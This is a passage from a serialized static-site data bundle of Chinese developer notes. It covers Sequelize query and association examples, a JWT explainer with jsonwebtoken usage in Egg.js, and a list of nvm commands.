},\n                {\n                    description: {\n                        [op.like]: '%boat%'\n                    }\n                }\n            ]\n        }\n        // title like 'boat%' or description like '%boat%'\n    }\n});\n\n\n使用 op.not 示例#\n\nproject.findall({\n    where: {\n        name: 'some project',\n        [op.not]: [{\n                id: [1, 2, 3]\n            },\n            {\n                description: {\n                    [op.like]: 'hello%'\n                }\n            }\n        ]\n    }\n});\n上面将生成：\n\nselect *\n    from `projects`\nwhere(\n    `projects`.\n    `name` = 'a project'\n    and not(\n        `projects`.\n        `id`\n        in(1, 2, 3) or `projects`.\n        `description`\n        like 'hello%'\n    )\n)\n\n\n\n# update\n\n// 将所有没有姓氏的人更改为 \"doe\"\nawait usersmodel.update({\n    lastname: \"doe\"\n}, {\n    where: {\n        lastname: null\n    }\n});\n\n\n\n# delete\n\n// 删除所有名为 \"jane\" 的人 \nawait usersmodel.destroy({\n  where: {\n\n    firstname: \"jane\"\n\n  }\n}); \n\n\n\n> 要销毁所有内容,可以使用 truncate sql：\n\n// 截断表格\nawait user.destroy({\n  truncate: true\n});\n\n\n\n# findall\n\nfindall 方法. 它生成一个标准的 select 查询, 该查询将从表中检索所有条目(除非受到 where 子句的限制).\n\n\n# findbypk\n\nfindbypk 方法使用提供的主键从表中仅获得一个条目.\n\nconst project = await project.findbypk(123);\nif (project === null) {\n    console.log('not found!');\n} else {\n    console.log(project instanceof project); // true\n    // 它的主键是 123\n}\n\n\n\n# findone\n\nfindone 方法获得它找到的第一个条目(它可以满足提供的可选查询参数).\n\nconst project = await project.findone({\n    where: {\n        title: 'my title'\n    }\n});\nif (project === null) {\n    console.log('not found!');\n} else {\n    console.log(project instanceof project); // true\n    console.log(project.title); // 'my title'\n}\n\n\n\n# findorcreate\n\n> 除非找到一个满足查询参数的结果, 否则方法 findorcreate 将在表中创建一个条目. 在这两种情况下, 它将返回一个实例(找到的实例或创建的实例)和一个布尔值, 指示该实例是已创建还是已经存在.\n\n使用 where 参数来查找条目, 而使用 defaults 参数来定义必须创建的内容. 如果 defaults 不包含每一列的值, 则 sequelize 将采用 where 的值(如果存在).\n\n假设我们有一个空的数据库, 该数据库具有一个 user 模型, 该模型具有一个 username 和一个 job.\n\nconst [user, created] = await user.findorcreate({\n    where: {\n        username: 'sdepold'\n    },\n    defaults: {\n        job: 'technical lead javascript'\n    }\n});\nconsole.log(user.username); // 'sdepold'\nconsole.log(user.job); // 这可能是也可能不是 'technical lead javascript'\nconsole.log(created); // 指示此实例是否刚刚创建的布尔值\nif (created) {\n    console.log(user.job); // 这里肯定是 'technical lead javascript'\n}\n\n\n\n# findandcountall\n\n> findandcountall 方法是结合了 findall 和 count 的便捷方法. 在处理与分页有关的查询时非常有用, 在分页中, 你想检索带有 limit 和 offset 的数据, 但又需要知道与查询匹配的记录总数.\n\nfindandcountall 方法返回一个具有两个属性的对象：\n\ncount - 一个整数 - 符合查询条件的记录总数\nrows - 一个数组对象 - 获得的记录\nconst {\n    count,\n    rows\n} = await project.findandcountall({\n    where: {\n        title: {\n            [op.like]: 'foo%'\n        }\n    },\n    offset: 10,\n    limit: 2\n});\nconsole.log(count);\nconsole.log(rows);\n\n\n\n# 关联查的一些方法\n\n> sequelize 支持标准关联关系: 一对一, 一对多 和 多对多.\n\n * a.hasone(b) 关联意味着 a 和 b 之间存在一对一的关系, 外键在目标模型(b)中定义.\n\n * a.belongsto(b)关联意味着 a 和 b 之间存在一对一的关系, 外键在源模型中定义(a).\n\n * a.hasmany(b) 关联意味着 a 和 b 之间存在一对多关系, 外键在目标模型(b)中定义.\n\n> 这三个调用将导致 sequelize 自动将外键添加到适当的模型中(除非它们已经存在).\n\n * a.belongstomany(b, { through: 'c' }) 关联意味着将表 c 用作联结表, 在 a 和 b 之间存在多对多关系. 具有外键(例如, aid 和 bid). sequelize 将自动创建此模型 c(除非已经存在), 并在其上定义适当的外\n\n\n# 一对一关系\n\n> 对于本示例的其余部分, 我们假设我们有两个模型, 即 foo 和 bar. 我们想要在它们之间建立一对一的关系, 以便 bar 获得 fooid 列.\n\n实现该目标的主要设置如下：\n\nfoo.hasone(bar);\nbar.belongsto(foo);\n\n\n自定义外键\n\n> 上面显示的 hasone 和 belongsto 调用都会推断出要创建的外键应称为 fooid. 如要使用其他名称, 例如 myfooid：\n\n// 方法 1\nfoo.hasone(bar, {\n    foreignkey: 'myfooid', //从表的id\n    as: 'acticle', //定义别名\n    sourcekey: 'article_id' //当前主表的id \n});\nbar.belongsto(foo);\n\n// 方法 2\nfoo.hasone(bar, {\n    foreignkey: {\n        name: 'myfooid'\n    }\n});\nbar.belongsto(foo);\n\n// 方法 3\nfoo.hasone(bar);\nbar.belongsto(foo, {\n    foreignkey: 'myfooid'\n});\n\n// 方法 4\nfoo.hasone(bar);\nbar.belongsto(foo, {\n    foreignkey: {\n        name: 'myfooid'\n    }\n});\n\n\ntip\n\nship.belongsto(captain, {\n    targetkey: 'name',\n    foreignkey: 'captainname'\n});\na.hasone(b) 和 a.hasmany(b) 将外键保留在目标模型(b)中,因此引用的键在源模型中,因此使用了 sourcekey. \n原模型 需要关联的字段id 是  sourcekey\nforeignkey 对应的id 是目标源的id\na.belongsto(b) 将外键保留在源模型中(a),因此引用的键在目标模型中,因此使用了 targetkey.\n外键保存源模型  foreignkey  为查询的从 id\n外键保存目标模型  foreignkey  为主的 id\n\n\n\n以上方法可用于一对一\n\n强制性与可选性关联\n\n> 默认情况下, 该关联被视为可选. 换句话说, 在我们的示例中, fooid 允许为空, 这意味着一个 bar 可以不存在 foo 而存在. 只需在外键选项中指定 allownull: false 即可更改此设置：\n\nfoo.hasone(bar, {\n    foreignkey: {\n        allownull: false\n    }\n});\n\n\n\n# 一对多关系\n\n> 在这个例子中, 我们有模型 team 和 player. 我们要告诉 sequelize, 他们之间存在一对多的关系, 这意味着一个 team 有 player , 而每个 player 都属于一个 team.\n\nteam.hasmany(player);\nplayer.belongsto(team);\n\n\nteam.hasmany(player, {\n    foreignkey: 'myfooid', //从表的id\n    as: 'acticle', //定义别名\n    sourcekey: 'article_id' //当前主表的id \n});\nplayer.belongsto(team);\n",charsets:{cjk:!0}},{title:"来及阮一峰老师的介绍简要",frontmatter:{},regularPath:"/Node/Egg/jwt.html",relativePath:"Node/Egg/jwt.md",key:"v-cc9d725c",path:"/Node/Egg/jwt.html",headers:[{level:2,title:"来及阮一峰老师的介绍简要",slug:"来及阮一峰老师的介绍简要",normalizedTitle:"来及阮一峰老师的介绍简要",charIndex:2},{level:3,title:"一、跨域认证的问题",slug:"一、跨域认证的问题",normalizedTitle:"一、跨域认证的问题",charIndex:19},{level:3,title:"二、JWT 的原理",slug:"二、jwt-的原理",normalizedTitle:"二、jwt 的原理",charIndex:589},{level:3,title:"三、JWT 的数据结构",slug:"三、jwt-的数据结构",normalizedTitle:"三、jwt 的数据结构",charIndex:847},{level:3,title:"四、JWT 的使用方式",slug:"四、jwt-的使用方式",normalizedTitle:"四、jwt 的使用方式",charIndex:2419},{level:3,title:"五、JWT 的几个特点",slug:"五、jwt-的几个特点",normalizedTitle:"五、jwt 的几个特点",charIndex:2659},{level:2,title:"node.js(Egg)的jsonwebtoken的使用",slug:"node-js-egg-的jsonwebtoken的使用",normalizedTitle:"node.js(egg)的jsonwebtoken的使用",charIndex:3063},{level:3,title:"Install",slug:"install",normalizedTitle:"install",charIndex:3096},{level:3,title:"Usage（使用）",slug:"usage-使用",normalizedTitle:"usage（使用）",charIndex:3139},{level:3,title:"verify (验证token)",slug:"verify-验证token",normalizedTitle:"verify (验证token)",charIndex:4667}],headersStr:"来及阮一峰老师的介绍简要 一、跨域认证的问题 二、JWT 的原理 三、JWT 的数据结构 四、JWT 的使用方式 五、JWT 的几个特点 node.js(Egg)的jsonwebtoken的使用 Install Usage（使用） verify (验证token)",content:'# 来及阮一峰老师的介绍简要\n\n\n# 一、跨域认证的问题\n\n> 互联网服务离不开用户认证。一般流程是下面这样。\n\n1、用户向服务器发送用户名和密码。\n\n2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。\n\n3、服务器向用户返回一个 session_id，写入用户的 Cookie。\n\n4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。\n\n5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。\n\nTIP\n\n这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。\n\n举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？\n\n一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。\n\n另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。\n\n\n# 二、JWT 的原理\n\n> JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。\n\n{\n  "姓名": "张三",\n  "角色": "管理员",\n  "到期时间": "2018年7月1日0点0分"\n}\n\n\n以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。\n\n服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展\n\n\n# 三、JWT 的数据结构\n\n> 实际的 JWT 大概就像下面这样。\n\n"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlck5hbWUiOiJhZG1pbiIsImlhdCI6MTYxMzAyOTU5OCwiZXhwIjoxNjEzMTE1OTk4fQ.n-7lLPENQWmaqiKO-u7aXoNFGxl0PIgGQ52UVD92jn4"\n\n\nTIP\n\n它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。\n\n# JWT 的三个部分依次如下。\n\n\n*  Header（头部）\n*  Payload（负载）\n*  Signature（签名）\n\n\n\n> 写成一行，就是下面的样子。\n\n\nHeader.Payload.Signature\n\n\n# 3.1Header\n\n> Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。\n\n\n{\n  "alg": "HS256",\n  "typ": "JWT"\n}\n\n\n> 上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。\n\n最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。\n\n# 3.2 Payload\n\n> Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。\n\n\niss (issuer)：签发人\nexp (expiration time)：过期时间\nsub (subject)：主题\naud (audience)：受众\nnbf (Not Before)：生效时间\niat (Issued At)：签发时间\njti (JWT ID)：编号\n\n\n除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。\n\n\n{\n  "sub": "1234567890",\n  "name": "John Doe",\n  "admin": true\n}\n\n\nTIP\n\n注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个 JSON 对象也要使用 Base64URL 算法转成字符串\n\n# 3.3 Signature\n\n> Signature 部分是对前两部分的签名，防止数据篡改。\n\n首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。\n\n\nHMACSHA256(\n  base64UrlEncode(header) + "." +\n  base64UrlEncode(payload),\n  secret)\n\n\n> 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。\n\n# 3.4 Base64URL\n\n前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。\n\nJWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。\n\n\n# 四、JWT 的使用方式\n\n客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。\n\n此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。\n\n\nAuthorization: Bearer <token>\n\n\n\n另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。\n\n\n# 五、JWT 的几个特点\n\n（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。\n\n（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。\n\n（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。\n\n（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。\n\n（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。\n\n（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。\n\n\n# node.js(Egg)的jsonwebtoken的使用\n\n\n# Install\n\n\n$ npm install jsonwebtoken\n\n\n\n\n# Usage（使用）\n\n# jwt.sign(payload, secretOrPrivateKey, [options, callback]) 生成token\n\n(异步) 如果有回调 token 将在回调或者erro 中存在\n\n\njwt.sign({ foo: \'bar\' }, privateKey, { algorithm: \'RS256\' }, function(err, token) {\n  console.log(token);\n});\n\n\n(同步) 将以字符串的形式传出\n\n\n1\nvar jwt = require(\'jsonwebtoken\');\nvar token = jwt.sign({ foo: \'bar\' }, \'shhhhh\');\n2\nvar privateKey = fs.readFileSync(\'private.key\');\nvar token = jwt.sign({ foo: \'bar\' }, privateKey, { algorithm: \'RS256\' });\n\n\n\n# payload\n\n> 传入的是一个对象格式的，如果不是对象格式的默认调取JSON.stringify\n\n# secretOrPrivateKey (一般为密钥字符窜 对象格式未尝试)\n\n> 是一个字符串、缓冲区或对象，其中包含HMAC算法的密钥或RSA和ECDSA的PEM编码的私钥。对于带有passphrase的私钥，可以使用对象{key, passphrase}(基于加密文档)，在这种情况下，请确保传递了算法选项。\n\n# options\n\n * algorithm (default: HS256)\n * expiresIn: 单位为秒或描述时间跨度的字符串 (days, hours, etc)。\n\n例如:60，"2 days"，"10h"，"7d"。数值被解释为秒数。如果你使用一个字符串，确保你提供了时间单位(天，小时，等等)，否则默认使用毫秒单位(“120”等于“120ms”)\n\n * notBefore: 单位为秒或描述时间跨度的字符串 (days, hours, etc)。\n\n例如:60，"2 days"，"10h"，"7d"。数值被解释为秒数。如果你使用一个字符串，确保你提供了时间单位(天，小时，等等)，否则默认使用毫秒单位(“120”等于“120ms”)\n\n * audience\n * issuer\n * jwtid\n * subject\n * noTimestamp\n * header\n * keyid\n\nmutatePayload: 如果为true, sign函数将直接修改payload对象。如果在声明应用到有效负载之后，但在有效负载被编码到令牌之前，您需要它的原始引用，那么这是很有用的。\n\n# 一般生成token使用\n\n  // token密钥和时间\n  this.config.jwt = {\n      secret: \'token\',\n      expiresIn: 60 * 60 * 24, // 1天过期\n  };\n  const token = JWT.sign({\n          id: res.id,\n          userName: res.user,\n      },\n      this.config.jwt.secret, {\n          expiresIn: this.config.jwt.expiresIn,\n      }\n  );\n  data = {\n      id: res.id,\n      token\n  };\n\n\n\n# verify (验证token)\n\n（异步）如果提供了回调，则函数将异步操作。如果签名有效且可选的有效期，受众或发行者有效，则使用解码后的有效负载调用回调。如果没有，它将被错误调用。\n\n（同步）如果未提供回调，则函数将同步执行。如果签名有效且可选的有效期限，受众或发行者有效，则返回解码后的有效负载。如果没有，它将抛出错误。\n\n    return async function(ctx, next) {\n        const {\n            whiteList,\n            secret\n        } = ctx.app.config.jwt;\n        const isRole = whiteList.includes(ctx.request.path);\n        if (isRole) {\n            // 拿到传会数据的header 中的token值\n            const token = ctx.request.header.authorization ? ctx.request.header.authorization.split(\' \')[1] : null;\n            if (!token) {\n                ctx.returnBody(\'未登录,请先登录\', 401, 401);\n            } else {\n                try {\n                    const loginUser = jwt.verify(token, secret);\n                    await next();\n                } catch (error) {\n                    ctx.returnBody(error, 402, 401);\n                }\n            }\n        } else {\n            await next();\n        }\n    };\n\n\n# 错误回调\n\n\njwt.verify(token, \'shhhhh\', function(err, decoded) {\n  if (err) {\n    /*\n      err = {\n        name: \'TokenExpiredError\',\n        message: \'jwt expired\',\n        expiredAt: 1408621000\n      }\n    */\n  }\n});\n',normalizedContent:'# 来及阮一峰老师的介绍简要\n\n\n# 一、跨域认证的问题\n\n> 互联网服务离不开用户认证。一般流程是下面这样。\n\n1、用户向服务器发送用户名和密码。\n\n2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。\n\n3、服务器向用户返回一个 session_id，写入用户的 cookie。\n\n4、用户随后的每一次请求，都会通过 cookie，将 session_id 传回服务器。\n\n5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。\n\ntip\n\n这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。\n\n举例来说，a 网站和 b 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？\n\n一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。\n\n另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。jwt 就是这种方案的一个代表。\n\n\n# 二、jwt 的原理\n\n> jwt 的原理是，服务器认证以后，生成一个 json 对象，发回给用户，就像下面这样。\n\n{\n  "姓名": "张三",\n  "角色": "管理员",\n  "到期时间": "2018年7月1日0点0分"\n}\n\n\n以后，用户与服务端通信的时候，都要发回这个 json 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。\n\n服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展\n\n\n# 三、jwt 的数据结构\n\n> 实际的 jwt 大概就像下面这样。\n\n"token": "eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswidxnlck5hbwuioijhzg1pbiisimlhdci6mtyxmzayotu5ocwizxhwijoxnjezmte1otk4fq.n-7llpenqwmaqiko-u7axonfgxl0piggq52uvd92jn4"\n\n\ntip\n\n它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，jwt 内部是没有换行的，这里只是为了便于展示，将它写成了几行。\n\n# jwt 的三个部分依次如下。\n\n\n*  header（头部）\n*  payload（负载）\n*  signature（签名）\n\n\n\n> 写成一行，就是下面的样子。\n\n\nheader.payload.signature\n\n\n# 3.1header\n\n> header 部分是一个 json 对象，描述 jwt 的元数据，通常是下面的样子。\n\n\n{\n  "alg": "hs256",\n  "typ": "jwt"\n}\n\n\n> 上面代码中，alg属性表示签名的算法（algorithm），默认是 hmac sha256（写成 hs256）；typ属性表示这个令牌（token）的类型（type），jwt 令牌统一写为jwt。\n\n最后，将上面的 json 对象使用 base64url 算法（详见后文）转成字符串。\n\n# 3.2 payload\n\n> payload 部分也是一个 json 对象，用来存放实际需要传递的数据。jwt 规定了7个官方字段，供选用。\n\n\niss (issuer)：签发人\nexp (expiration time)：过期时间\nsub (subject)：主题\naud (audience)：受众\nnbf (not before)：生效时间\niat (issued at)：签发时间\njti (jwt id)：编号\n\n\n除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。\n\n\n{\n  "sub": "1234567890",\n  "name": "john doe",\n  "admin": true\n}\n\n\ntip\n\n注意，jwt 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个 json 对象也要使用 base64url 算法转成字符串\n\n# 3.3 signature\n\n> signature 部分是对前两部分的签名，防止数据篡改。\n\n首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 header 里面指定的签名算法（默认是 hmac sha256），按照下面的公式产生签名。\n\n\nhmacsha256(\n  base64urlencode(header) + "." +\n  base64urlencode(payload),\n  secret)\n\n\n> 算出签名以后，把 header、payload、signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。\n\n# 3.4 base64url\n\n前面提到，header 和 payload 串型化的算法是 base64url。这个算法跟 base64 算法基本类似，但有一些小的不同。\n\njwt 作为一个令牌（token），有些场合可能会放到 url（比如 api.example.com/?token=xxx）。base64 有三个字符+、/和=，在 url 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 base64url 算法。\n\n\n# 四、jwt 的使用方式\n\n客户端收到服务器返回的 jwt，可以储存在 cookie 里面，也可以储存在 localstorage。\n\n此后，客户端每次与服务器通信，都要带上这个 jwt。你可以把它放在 cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 http 请求的头信息authorization字段里面。\n\n\nauthorization: bearer <token>\n\n\n\n另一种做法是，跨域的时候，jwt 就放在 post 请求的数据体里面。\n\n\n# 五、jwt 的几个特点\n\n（1）jwt 默认是不加密，但也是可以加密的。生成原始 token 以后，可以用密钥再加密一次。\n\n（2）jwt 不加密的情况下，不能将秘密数据写入 jwt。\n\n（3）jwt 不仅可以用于认证，也可以用于交换信息。有效使用 jwt，可以降低服务器查询数据库的次数。\n\n（4）jwt 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 jwt 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。\n\n（5）jwt 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，jwt 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。\n\n（6）为了减少盗用，jwt 不应该使用 http 协议明码传输，要使用 https 协议传输。\n\n\n# node.js(egg)的jsonwebtoken的使用\n\n\n# install\n\n\n$ npm install jsonwebtoken\n\n\n\n\n# usage（使用）\n\n# jwt.sign(payload, secretorprivatekey, [options, callback]) 生成token\n\n(异步) 如果有回调 token 将在回调或者erro 中存在\n\n\njwt.sign({ foo: \'bar\' }, privatekey, { algorithm: \'rs256\' }, function(err, token) {\n  console.log(token);\n});\n\n\n(同步) 将以字符串的形式传出\n\n\n1\nvar jwt = require(\'jsonwebtoken\');\nvar token = jwt.sign({ foo: \'bar\' }, \'shhhhh\');\n2\nvar privatekey = fs.readfilesync(\'private.key\');\nvar token = jwt.sign({ foo: \'bar\' }, privatekey, { algorithm: \'rs256\' });\n\n\n\n# payload\n\n> 传入的是一个对象格式的，如果不是对象格式的默认调取json.stringify\n\n# secretorprivatekey (一般为密钥字符窜 对象格式未尝试)\n\n> 是一个字符串、缓冲区或对象，其中包含hmac算法的密钥或rsa和ecdsa的pem编码的私钥。对于带有passphrase的私钥，可以使用对象{key, passphrase}(基于加密文档)，在这种情况下，请确保传递了算法选项。\n\n# options\n\n * algorithm (default: hs256)\n * expiresin: 单位为秒或描述时间跨度的字符串 (days, hours, etc)。\n\n例如:60，"2 days"，"10h"，"7d"。数值被解释为秒数。如果你使用一个字符串，确保你提供了时间单位(天，小时，等等)，否则默认使用毫秒单位(“120”等于“120ms”)\n\n * notbefore: 单位为秒或描述时间跨度的字符串 (days, hours, etc)。\n\n例如:60，"2 days"，"10h"，"7d"。数值被解释为秒数。如果你使用一个字符串，确保你提供了时间单位(天，小时，等等)，否则默认使用毫秒单位(“120”等于“120ms”)\n\n * audience\n * issuer\n * jwtid\n * subject\n * notimestamp\n * header\n * keyid\n\nmutatepayload: 如果为true, sign函数将直接修改payload对象。如果在声明应用到有效负载之后，但在有效负载被编码到令牌之前，您需要它的原始引用，那么这是很有用的。\n\n# 一般生成token使用\n\n  // token密钥和时间\n  this.config.jwt = {\n      secret: \'token\',\n      expiresin: 60 * 60 * 24, // 1天过期\n  };\n  const token = jwt.sign({\n          id: res.id,\n          username: res.user,\n      },\n      this.config.jwt.secret, {\n          expiresin: this.config.jwt.expiresin,\n      }\n  );\n  data = {\n      id: res.id,\n      token\n  };\n\n\n\n# verify (验证token)\n\n（异步）如果提供了回调，则函数将异步操作。如果签名有效且可选的有效期，受众或发行者有效，则使用解码后的有效负载调用回调。如果没有，它将被错误调用。\n\n（同步）如果未提供回调，则函数将同步执行。如果签名有效且可选的有效期限，受众或发行者有效，则返回解码后的有效负载。如果没有，它将抛出错误。\n\n    return async function(ctx, next) {\n        const {\n            whitelist,\n            secret\n        } = ctx.app.config.jwt;\n        const isrole = whitelist.includes(ctx.request.path);\n        if (isrole) {\n            // 拿到传会数据的header 中的token值\n            const token = ctx.request.header.authorization ? ctx.request.header.authorization.split(\' \')[1] : null;\n            if (!token) {\n                ctx.returnbody(\'未登录,请先登录\', 401, 401);\n            } else {\n                try {\n                    const loginuser = jwt.verify(token, secret);\n                    await next();\n                } catch (error) {\n                    ctx.returnbody(error, 402, 401);\n                }\n            }\n        } else {\n            await next();\n        }\n    };\n\n\n# 错误回调\n\n\njwt.verify(token, \'shhhhh\', function(err, decoded) {\n  if (err) {\n    /*\n      err = {\n        name: \'tokenexpirederror\',\n        message: \'jwt expired\',\n        expiredat: 1408621000\n      }\n    */\n  }\n});\n',charsets:{cjk:!0}},{title:"pm2",frontmatter:{},regularPath:"/Node/pm2.html",relativePath:"Node/pm2.md",key:"v-321db935",path:"/Node/pm2.html",headersStr:null,content:"# pm2",normalizedContent:"# pm2",charsets:{}},{title:"Node.js版本控制和切换",frontmatter:{},regularPath:"/Node/nvm.html",relativePath:"Node/nvm.md",key:"v-5c7a4195",path:"/Node/nvm.html",headers:[{level:2,title:"下载(下载地址)",slug:"下载-下载地址",normalizedTitle:"下载(下载地址)",charIndex:61},{level:2,title:"安装测试",slug:"安装测试",normalizedTitle:"安装测试",charIndex:74},{level:2,title:"NVM常用命令",slug:"nvm常用命令",normalizedTitle:"nvm常用命令",charIndex:120}],headersStr:"下载(下载地址) 安装测试 NVM常用命令",content:"# Node.js版本控制和切换\n\n> nvm是node.js的版本管理器，可以安装和切换不同版本node.js\n\n\n# 下载(下载地址)\n\n\n# 安装测试\n\n * 安装一致下一步即可\n * cmd 命令行输入nvm 说明安装成功\n\n\n# NVM常用命令\n\n * nvm list 查看已经安装的版本\n * nvm list installed 查看已经安装的版本\n * nvm list available 查看网络可以安装的版本\n * nvm version 查看当前的版本\n * nvm install 安装最新版本nvm\n * nvm use <version> 切换使用指定的版本node\n * nvm ls 列出所有版本\n * nvm current显示当前版本\n * nvm alias<name> <version>## 给不同的版本号添加别名\n * nvm unalias <name> ## 删除已定义的别名\n * nvm reinstall-packages <version> ## 在当前版本node环境下，重新全局安装指定版本号的npm包\n * nvm on 打开nodejs控制\n * nvm off 关闭nodejs控制\n * nvm proxy 查看设置与代理\n * nvm node_mirror [url] 设置或者查看setting.txt中的node_mirror，如果不设置的默认是 https://nodejs.org/dist/\n * nvm npm_mirror [url] 设置或者查看setting.txt中的npm_mirror,如果不设置的话默认的是： https://github.com/npm/npm/archive/.\n * nvm uninstall <version>卸载制定的版本\n * nvm use [version] [arch] 切换制定的node版本和位数\n * nvm root [path] 设置和查看root路径",normalizedContent:"# node.js版本控制和切换\n\n> nvm是node.js的版本管理器，可以安装和切换不同版本node.js\n\n\n# 下载(下载地址)\n\n\n# 安装测试\n\n * 安装一致下一步即可\n * cmd 命令行输入nvm 说明安装成功\n\n\n# nvm常用命令\n\n * nvm list 查看已经安装的版本\n * nvm list installed 查看已经安装的版本\n * nvm list available 查看网络可以安装的版本\n * nvm version 查看当前的版本\n * nvm install 安装最新版本nvm\n * nvm use <version> 切换使用指定的版本node\n * nvm ls 列出所有版本\n * nvm current显示当前版本\n * nvm alias<name> <version>## 给不同的版本号添加别名\n * nvm unalias <name> ## 删除已定义的别名\n * nvm reinstall-packages <version> ## 在当前版本node环境下，重新全局安装指定版本号的npm包\n * nvm on 打开nodejs控制\n * nvm off 关闭nodejs控制\n * nvm proxy 查看设置与代理\n * nvm node_mirror [url] 设置或者查看setting.txt中的node_mirror，如果不设置的默认是 https://nodejs.org/dist/\n * nvm npm_mirror [url] 设置或者查看setting.txt中的npm_mirror,如果不设置的话默认的是： https://github.com/npm/npm/archive/.\n * nvm uninstall <version>卸载制定的版本\n * nvm use [version] [arch] 切换制定的node版本和位数\n * nvm root [path] 设置和查看root路径",charsets:{cjk:!0}},{title:"Npm的常用命令",frontmatter:{},regularPath:"/Node/npm.html",relativePath:"Node/npm.md",key:"v-4d169389",path:"/Node/npm.html",headers:[{level:2,title:"一、镜像源链接切换",slug:"一、镜像源链接切换",normalizedTitle:"一、镜像源链接切换",charIndex:15},{level:2,title:"二、使用 nrm 切换镜像源",slug:"二、使用-nrm-切换镜像源",normalizedTitle:"二、使用 nrm 切换镜像源",charIndex:176},{level:2,title:"三，快速完全删除node_modules",slug:"三-快速完全删除node-modules",normalizedTitle:"三，快速完全删除node_modules",charIndex:269},{level:2,title:"四、npm -v :版本查询",slug:"四、npm-v-版本查询",normalizedTitle:"四、npm -v :版本查询",charIndex:339},{level:2,title:"五、安装依赖",slug:"五、安装依赖",normalizedTitle:"五、安装依赖",charIndex:358},{level:2,title:"其他指令",slug:"其他指令",normalizedTitle:"其他指令",charIndex:496},{level:2,title:"git 秘钥",slug:"git-秘钥",normalizedTitle:"git 